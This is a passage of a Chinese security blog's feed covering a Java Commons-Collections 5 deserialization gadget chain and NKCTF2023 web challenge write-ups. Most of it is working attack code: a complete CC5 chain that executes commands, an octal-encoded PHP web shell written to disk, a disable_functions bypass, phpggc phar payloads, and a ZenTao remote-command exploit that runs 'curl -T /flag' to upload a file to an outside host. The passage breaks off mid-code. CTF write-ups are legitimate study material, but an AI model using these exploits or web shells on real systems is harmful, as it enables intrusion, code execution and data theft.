title="BadAttributeValueExpException"></a>BadAttributeValueExpException</h1><p>接下来看谁调用了<code>toString()</code>,在<code>BadAttributeValueExpException</code>类中的<code>readObject()</code>中发现调用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">       ObjectInputStream.<span class="type">GetField</span> <span class="variable">gf</span> <span class="operator">=</span> ois.readFields();</span><br><span class="line">       <span class="type">Object</span> <span class="variable">valObj</span> <span class="operator">=</span> gf.get(<span class="string">&quot;val&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (valObj == <span class="literal">null</span>) &#123;</span><br><span class="line">           val = <span class="literal">null</span>;</span><br><span class="line">       &#125; <span class="keyword">else</span> <span class="keyword">if</span> (valObj <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">           val= valObj;</span><br><span class="line">       &#125; <span class="keyword">else</span> <span class="keyword">if</span> (System.getSecurityManager() == <span class="literal">null</span></span><br><span class="line">               || valObj <span class="keyword">instanceof</span> Long</span><br><span class="line">               || valObj <span class="keyword">instanceof</span> Integer</span><br><span class="line">               || valObj <span class="keyword">instanceof</span> Float</span><br><span class="line">               || valObj <span class="keyword">instanceof</span> Double</span><br><span class="line">               || valObj <span class="keyword">instanceof</span> Byte</span><br><span class="line">               || valObj <span class="keyword">instanceof</span> Short</span><br><span class="line">               || valObj <span class="keyword">instanceof</span> Boolean) &#123;</span><br><span class="line">           val = valObj.toString();</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123; <span class="comment">// the serialized object is from a version without JDK-8019292 fix</span></span><br><span class="line">           val = System.identityHashCode(valObj) + <span class="string">&quot;@&quot;</span> + valObj.getClass().getName();</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>调用的是<code> valObj.toString();</code>，所以现在要做的就是如何将<code>valobj</code>构造成<code>TiedMapEntry</code>,看下<code>valobj</code>从哪来的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.<span class="type">GetField</span> <span class="variable">gf</span> <span class="operator">=</span> ois.readFields();</span><br><span class="line">       <span class="type">Object</span> <span class="variable">valObj</span> <span class="operator">=</span> gf.get(<span class="string">&quot;val&quot;</span>, <span class="literal">null</span>);</span><br></pre></td></tr></table></figure><p> public ObjectInputStream.GetField readFields();方法的返回类型为ObjectInputStream.GetField ，<strong>它返回GetField对象，该对象表示未序列化的对象的永久字段。</strong></p><p>先调用<code>readFields</code>从流中读取了所有的持久化字段，然后调用<code>get()</code>方法得到了名字是<code>val</code>的字段。</p><p>所以可以通过修改<code>val</code>的值，来修改<code>valobj</code>，而<code>val</code>是本类中的一个私有属性，直接反射修改即可</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Object val;<span class="comment">//private</span></span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;val&quot;</span>);<span class="comment">//反射修改</span></span><br><span class="line">field.set(obj,TiedMapEntry);</span><br></pre></td></tr></table></figure><img src="/2023/03/27/CC5/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM1NzMzNzUx,size_16,color_FFFFFF,t_70.png" class="" title="img"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections5</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>)),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, chainedTransformer);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap,<span class="string">&quot;admire@&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Reflection</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(badAttributeValueExpException,tiedMapEntry);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(badAttributeValueExpException);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object) ois.readObject();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;&#125;</span><br></pre></td></tr></table></figure><p>参考[(143条消息) <a href="https://blog.csdn.net/weixin_54902210/article/details/125078125">Java反序列化]—CommonsCollections5_Sentiment.的博客-CSDN博客</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;在分析CC5前看下CC1的lazymap链子&lt;/p&gt;
&lt;img src=&quot;/2023/03/27/CC5/1623075894_60be2c3691871913b637d.png!small&quot; class=&quot;&quot; title=&quot;1623075894_60be2c3691871</summary>
      
    
    
    
    
    <category term="java" scheme="http://example.com/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>NKCTF2023-web</title>
    <link href="http://example.com/2023/03/27/NKCTF2023-web/"/>
    <id>http://example.com/2023/03/27/NKCTF2023-web/</id>
    <published>2023-03-27T05:13:34.000Z</published>
    <updated>2023-03-30T08:29:11.030Z</updated>
    
    <content type="html"><![CDATA[<h1 id="baby-php"><a href="#baby-php" class="headerlink" title="baby_php"></a>baby_php</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Welcome</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&quot;welcome_to_NKCTF&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arg</span> = <span class="string">&#x27;oww!man!!&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hell0</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Happy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$shell</span>=<span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>=<span class="string">&#x27;echo &quot;\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76&quot; &gt;&gt; 1.php&#x27;</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span>  <span class="title class_">Welcome</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;arg=<span class="keyword">new</span> <span class="title class_">Hell0</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;arg-&gt;func=<span class="keyword">new</span> <span class="title class_">Happy</span>();</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]);<span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76&quot;</span> &gt;&gt; <span class="number">1</span>.php</span><br></pre></td></tr></table></figure><p>访问1.php连接木马</p><h1 id="eazy-php"><a href="#eazy-php" class="headerlink" title="eazy_php"></a>eazy_php</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /?a=byGcY&amp;b=sonZ7y&amp;e=114514.1&amp;NS[CTF.go=1 HTTP/1.1</span><br><span class="line">Host: d9fbe0f1-0abe-4119-9637-a8dca25493de.node.yuzhian.com.cn:8000</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 1336</span><br><span class="line">Origin: http://d9fbe0f1-0abe-4119-9637-a8dca25493de.node.yuzhian.com.cn:8000</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://d9fbe0f1-0abe-4119-9637-a8dca25493de.node.yuzhian.com.cn:8000/</span><br><span class="line">Cookie: _ga_KCSGQQ51ER=GS1.1.1679707283.11.0.1679707283.0.0.0; _ga=GA1.1.265554516.1678852156; td_cookie=3598715934</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">c=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1&amp;d=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&amp;cmd=(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%D5);</span><br></pre></td></tr></table></figure><h1 id="hard-php"><a href="#hard-php" class="headerlink" title="hard_php"></a>hard_php</h1><p>禁用的函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">passthru,exec,system,chroot,scandir,chgrp,chown,proc_open,proc_get_status,ini_alter,ini_alter,ini_restore,dl,pfsockopen,openlog,syslog,symlink,popepassthru,stream_socket_server,show_source</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]);<span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76&quot;</span> &gt;&gt; qqq.php</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NKCTF=%<span class="number">24</span>_%<span class="number">3</span>D%<span class="number">28</span>_%<span class="number">2</span>F_._%<span class="number">29</span>%<span class="number">5</span>B_%<span class="number">5</span>D%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">3</span>D%<span class="number">24</span>_.%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>_%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>_%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">24</span>_%<span class="number">5</span>B%<span class="number">24</span>_%<span class="number">3</span>D_.%<span class="number">24</span>__.%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>_.%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>_%<span class="number">5</span>D%<span class="number">28</span>%<span class="number">24</span>%<span class="number">24</span>_%<span class="number">5</span>B_%<span class="number">5</span>D%<span class="number">29</span>%<span class="number">3</span>B&amp;_POST=shell_exec&amp;_=<span class="keyword">echo</span> <span class="string">&quot;\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76&quot;</span> &gt;&gt; qqq.php</span><br></pre></td></tr></table></figure><p>访问qqq.php</p><p>连接一句话木马即可</p><h1 id="easy-pms"><a href="#easy-pms" class="headerlink" title="easy_pms"></a>easy_pms</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">proxies = &#123;</span><br><span class="line">    <span class="comment"># &quot;http&quot;: &quot;127.0.0.1:8080&quot;,</span></span><br><span class="line">    <span class="comment"># &quot;https&quot;: &quot;127.0.0.1:8080&quot;,</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">url</span>):</span><br><span class="line">    url1 = url + <span class="string">&#x27;/misc-captcha-user.html&#x27;</span></span><br><span class="line">    <span class="comment"># url1 = url+&#x27;/index.php?m=misc&amp;f=captcha&amp;sessionVar=user&#x27;#非伪静态版本按照此格式传参</span></span><br><span class="line">    <span class="comment"># url2 = url+&#x27;/index.php?m=block&amp;f=printBlock&amp;id=1&amp;module=my&#x27;#可判断验证绕过的链接</span></span><br><span class="line">    url3 = url + <span class="string">&#x27;repo-create.html&#x27;</span></span><br><span class="line">    url4 = url + <span class="string">&#x27;repo-edit-10000-10000.html&#x27;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;zentaosid=609469cguj3v629dl94jtkd8u8; lang=zh-cn; device=desktop; theme=default&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    headers2 = &#123;</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;zentaosid=609469cguj3v629dl94jtkd8u8; lang=zh-cn; device=desktop; theme=default&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">        <span class="string">&quot;X-Requested-With&quot;</span>: <span class="string">&quot;XMLHttpRequest&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Referer&quot;</span>: url + <span class="string">&quot;/repo-edit-1-0.html&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    data1 = <span class="string">&#x27;product%5B%5D=1&amp;SCM=Gitlab&amp;name=66666&amp;path=&amp;encoding=utf-8&amp;client=&amp;account=&amp;password=&amp;encrypt=base64&amp;desc=&amp;gid=&#x27;</span></span><br><span class="line">    data2 = <span class="string">&#x27;SCM=Subversion&amp;client=`curl -T /flag https://6j3032p266.goho.co`&#x27;</span></span><br><span class="line">    s = requests.session()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        req1 = s.get(url1, proxies=proxies, timeout=<span class="number">5</span>, verify=<span class="literal">False</span>, headers=headers)</span><br><span class="line">        req3 = s.post(url3, data=data1, proxies=proxies, timeout=<span class="number">5</span>, verify=<span class="literal">False</span>, headers=headers2)</span><br><span class="line">        req4 = s.post(url4, data=data2, proxies=proxies, timeout=<span class="number">5</span>, verify=<span class="literal">False</span>, headers=headers2)</span><br><span class="line">        <span class="built_in">print</span>(req4.text)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;uid=&#x27;</span> <span class="keyword">in</span> req4.text:</span><br><span class="line">            <span class="built_in">print</span>(url, <span class="string">&quot;&quot;</span>)</span><br><span class="line">            <span class="comment"># print(req4.text)</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(check(<span class="string">&quot;http://674cdf20-a3c2-455c-aac6-1680648b46ef.node2.yuzhian.com.cn/&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><img src="/2023/03/27/NKCTF2023-web/image-20230325161320191.png" class="" title="image-20230325161320191"><img src="/2023/03/27/NKCTF2023-web/image-20230325161247227.png" class="" title="image-20230325161247227"><h1 id="webpagetest"><a href="#webpagetest" class="headerlink" title="webpagetest"></a>webpagetest</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">./phpggc Monolog/RCE2 passthru &#x27;pwd&#x27; -p phar -o testinfo.ini</span><br><span class="line">#进行url编码</span><br><span class="line">URLENC_PAYLOAD=$(cat testinfo.ini | xxd -p | tr -d &quot;\n&quot; | sed &quot;s#..#%&amp;#g&quot;)</span><br><span class="line">#写入文件</span><br><span class="line">curl -sSkig &#x27;http://4325e908-bf4a-4f35-93a5-a4d2de9e7515.node2.yuzhian.com.cn/runtest.php&#x27; -d &#x27;rkey=gadget&#x27; -d &quot;ini=$URLENC_PAYLOAD&quot; -o -</span><br><span class="line">#触发反序列化</span><br><span class="line">curl -sSkig &#x27;http://4325e908-bf4a-4f35-93a5-a4d2de9e7515.node2.yuzhian.com.cn/runtest.php&#x27; -d &#x27;rkey=phar:///var/www/html/results/gadget./testinfo.ini/foo&#x27; -d &quot;ini=$URLENC_PAYLOAD&quot; -o -</span><br></pre></td></tr></table></figure><p>没出来</p><h1 id="easy-cms"><a href="#easy-cms" class="headerlink" title="easy_cms"></a>easy_cms</h1><p>&#x2F;dede&#x2F;index.php</p><p>username:admin</p><p>password:admin</p><img src="/2023/03/27/NKCTF2023-web/image-20230327125553566.png" class="" title="image-20230327125553566"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\x73\x79\x73\x74\x65\x6d&quot;</span>(<span class="string">&quot;ls /&quot;</span>);<span 